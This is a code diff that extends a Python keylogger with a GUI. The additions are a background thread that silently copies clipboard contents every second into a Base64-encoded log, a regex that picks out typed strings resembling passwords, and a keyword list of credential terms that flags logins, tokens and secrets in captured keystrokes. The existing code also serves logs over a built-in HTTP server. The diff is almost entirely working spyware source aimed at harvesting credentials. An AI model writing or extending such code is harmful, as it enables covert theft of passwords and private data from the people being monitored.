@@ -7,6 +7,8 @@ import base64
 import os
 from threading import Thread
 from http.server import SimpleHTTPRequestHandler, HTTPServer
+import pyperclip
+import re
 
 class KeyloggerGUI:
     def __init__(self, root):
@@ -15,6 +17,16 @@ class KeyloggerGUI:
         self.root.geometry("900x600")
         self.root.configure(bg="#0D1117")  # Dark background
         self.log_file = "keylog_encoded.txt"  # Directly store Base64-encoded logs
+        self.clipboard_log_file = "clipboard_log_encoded.txt"
+        self.last_clipboard_content = None
+        self.clipboard_check_interval = 1  # Check every second
+        self.password_attempt_count = 0
+        self.password_attempt_threshold = 3  # Threshold for consecutive attempts
+        self.password_pattern = re.compile(r'^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&#])[A-Za-z\d@$!%*?&#]+$')
+        self.sensitive_words = ["admin", "administrator", "user", "login", "logout", "register", "sign up", "sign in", "password", "pass", "key", "token", "secret", "credentials", "2fa", "root", "superuser", "sudo", "privilege", "access", "test", "guest", "default", "welcome", "letmein", "iloveyou", "123456", "qwerty", "abc123", "monkey", "password1", "admin123", "123456789"]
+
+
+        Thread(target=self.monitorClipboard, daemon=True).start()
 
         # Set DPI awareness (Windows only)
         try:
@@ -74,6 +86,32 @@ class KeyloggerGUI:
         # Start HTTP server in a new thread
         Thread(target=self.startHttpServer, daemon=True).start()
 
+    def monitorClipboard(self):
+        """Continuously monitors clipboard for new content on frequent Ctrl+C events."""
+        while True:
+            try:
+                clipboard_content = pyperclip.paste()
+                if clipboard_content != self.last_clipboard_content:
+                    self.last_clipboard_content = clipboard_content
+                    self.logClipboardData(clipboard_content)
+            except Exception as e:
+                print("Clipboard monitoring error:", e)
+            time.sleep(self.clipboard_check_interval)  # Check every interval
+
+    def logClipboardData(self, content):
+        """Log Base64-encoded clipboard content to file."""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        entry = f"\n[{timestamp}] Clipboard Content: {content}\n"
+        
+        # Update log display
+        self.log_display.insert(tk.END, entry)
+        self.log_display.see(tk.END)
+
+        # Encode and save to file
+        encoded_entry = base64.b64encode(entry.encode()).decode()
+        with open(self.clipboard_log_file, "a") as f:
+            f.write(encoded_entry + "\n")
+
     def wordStacker(self, key):
         key = str(key).replace("'", "")
 
@@ -101,9 +139,13 @@ class KeyloggerGUI:
                 pass
         elif key == 'Key.space':
             self.enqueueIntoLog(''.join(self.word_stack) + ' ') 
+            self.checkForPasswordAttempt(''.join(self.word_stack))  # Check full entry here
+            self.checkForSensitiveWords(''.join(self.word_stack))  # Check for sensitive words
             self.word_stack.clear()
         elif key == 'Key.enter':
             self.enqueueIntoLog(''.join(self.word_stack) + '\n[ENTER]\n')
+            self.checkForPasswordAttempt(''.join(self.word_stack))  # Check full entry here
+            self.checkForSensitiveWords(''.join(self.word_stack))  # Check for sensitive words
             self.word_stack.clear()
         else:
             self.word_stack.append(key)
@@ -121,6 +163,25 @@ class KeyloggerGUI:
         self.log_display.see(tk.END)
         self.latesttime = time.time()
         self.saveLog(log_entry)
+    
+    def checkForPasswordAttempt(self, entry):
+        """Check if the completed entry is likely a failed password attempt."""
+        if self.password_pattern.match(entry):
+            self.password_attempt_count += 1
+            if self.password_attempt_count >= self.password_attempt_threshold:
+                self.enqueueIntoLog("ALERT: Three consecutive failed password attempts detected!")
+                self.password_attempt_count = 0  # Reset after alert
+        else:
+            self.password_attempt_count = 0  # Reset if criteria not met
+
+    def checkForSensitiveWords(self, entry):
+        """Check if the entry contains any sensitive words."""
+        # Convert entry to lowercase for case-insensitive comparison
+        entry_lower = entry.lower()
+        for word in self.sensitive_words:
+            if word in entry_lower:
+                self.enqueueIntoLog(f"ALERT: Sensitive word detected: '{word}'")
+                break  # Stop checking after the first match
 
     def saveLog(self, entry):
         """Append log entries as Base64-encoded data."""
